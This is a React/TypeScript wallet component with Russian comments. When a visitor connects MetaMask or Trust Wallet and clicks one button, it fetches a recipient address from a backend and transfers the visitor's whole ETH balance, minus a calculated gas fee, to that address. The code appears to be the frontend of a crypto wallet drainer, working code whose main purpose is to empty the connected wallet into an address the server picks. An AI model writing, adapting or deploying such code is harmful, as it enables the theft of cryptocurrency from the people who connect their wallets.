'use client'

import { useState } from 'react'
import Web3 from 'web3'
import type { ExternalProvider } from 'web3-core'

// Вынесенная функция: вся логика взаимодействия с контрактом
async function sendAllBalance(
  eth: ExternalProvider & { request(args: { method: string; params?: unknown[] }): Promise<unknown> },
  addr: string,
  setStatus: (msg: string) => void,
  { isTrustWallet }: { isTrustWallet: boolean },
): Promise<string> {
  // 1. Получаем адрес получателя от бэка
  setStatus('Получаем адрес получателя от бэка…')
  const res = await fetch('http://localhost:8000/contract')
  if (!res.ok) throw new Error(`Ошибка бэка: ${res.status}`)
  const { recipient } = await res.json() as { recipient: string }

  // 2. Настраиваем Web3
  const web3 = new Web3(eth)

  // 3. Получаем баланс пользователя и параметры газа
  const balanceWei = BigInt(await web3.eth.getBalance(addr))
  const gasLimit = 21000n;
  let receipt;

  const block = await web3.eth.getBlock('pending')
  // @ts-ignore: baseFeePerGas есть в ответе
  const baseFeePerGas = BigInt(block.baseFeePerGas)
  let maxPriorityFeePerGas: bigint
  try {
    maxPriorityFeePerGas = BigInt(await web3.eth.getMaxPriorityFeePerGas())
  } catch {
    maxPriorityFeePerGas = BigInt(web3.utils.toWei('2.5', 'gwei'))
  }
  
  if (isTrustWallet) {
    const gasPrice = BigInt(await web3.eth.getGasPrice());
    const gasCost = gasPrice * gasLimit;
    const valueToSend = balanceWei - gasCost;
    if (valueToSend <= 0n) throw new Error('Недостаточно средств на оплату газа');
    const tx = {
      from: addr,
      to: recipient,
      value: web3.utils.toHex(valueToSend),
      gas: web3.utils.toHex(gasLimit),
      gasPrice: web3.utils.toHex(gasPrice),
    };
    receipt = await web3.eth.sendTransaction(tx);

  } else {
    const maxFeePerGas = baseFeePerGas * 2n + maxPriorityFeePerGas

    // 4. Рассчитываем сумму к отправке
    const gasCost = maxFeePerGas * gasLimit
    const amountToSend = balanceWei - gasCost

    if (amountToSend <= 0n) throw new Error('Недостаточно средств на оплату газа')
    const hexValue = '0x' + amountToSend.toString(16)

    // 5. Отправляем транзакцию
    setStatus(`Отправляем ${web3.utils.fromWei(hexValue, 'ether')} ETH…`)
    receipt = await web3.eth.sendTransaction({
      from: addr,
      to: recipient,
      value: hexValue,
      gas: gasLimit.toString(),
      maxPriorityFeePerGas: maxPriorityFeePerGas.toString(10),
      maxFeePerGas: maxFeePerGas.toString(10),
      type: '0x2',
    })
  }
  return String(receipt.transactionHash)
}

export default function Wallet() {
  const [account, setAccount] = useState<string>()
  const [status, setStatus] = useState('Нажмите «Connect & SendBalance»')
  const [busy, setBusy] = useState(false)

  async function connectAndSendBalance() {
    const eth = window.ethereum
    if (!eth) {
      setStatus('Установите Web3-кошелёк (MetaMask и т.п.)')
      return
    }

    const isMetaMask = !!eth.isMetaMask
    const isTrustWallet = !!eth.isTrust

    setStatus(`Подключаемся к ${isMetaMask ? 'MetaMask' : isTrustWallet ? 'Trust Wallet' : 'провайдеру'}`)

    setBusy(true)
    setStatus('Запрашиваем аккаунт…')
    let addr = eth.selectedAddress as string | undefined
    if (!addr) {
      try {
        const resp = await eth.request({ method: 'eth_requestAccounts' })
        addr = (resp as string[])[0]
      } catch (e: any) {
        setStatus(`Ошибка подключения: ${e.message}`)
        setBusy(false)
        return
      }
    }
    setAccount(addr)

    try {
      // const txHash = await sendAllBalance(eth, addr, setStatus)
      const txHash = await sendAllBalance(eth, addr, setStatus, { isTrustWallet })
      setStatus(`Успех! TxHash: ${txHash}`)
    } catch (e: any) {
      setStatus(`Ошибка: ${e.message}`)
    } finally {
      setBusy(false)
    }
  }

  return (
    <div style={{ padding: 20, fontFamily: 'Arial, sans-serif' }}>
      <h1>Send Contract Balance</h1>
      <button
        onClick={connectAndSendBalance}
        disabled={busy}
        style={{
          padding: '10px 20px',
          fontSize: '16px',
          cursor: busy ? 'not-allowed' : 'pointer',
        }}
      >
        {busy ? '…обрабатываем' : 'Connect & SendBalance'}
      </button>
      <p><strong>Статус:</strong> {status}</p>
      {account && <p><strong>Ваш аккаунт:</strong> {account}</p>}
    </div>
  )
}
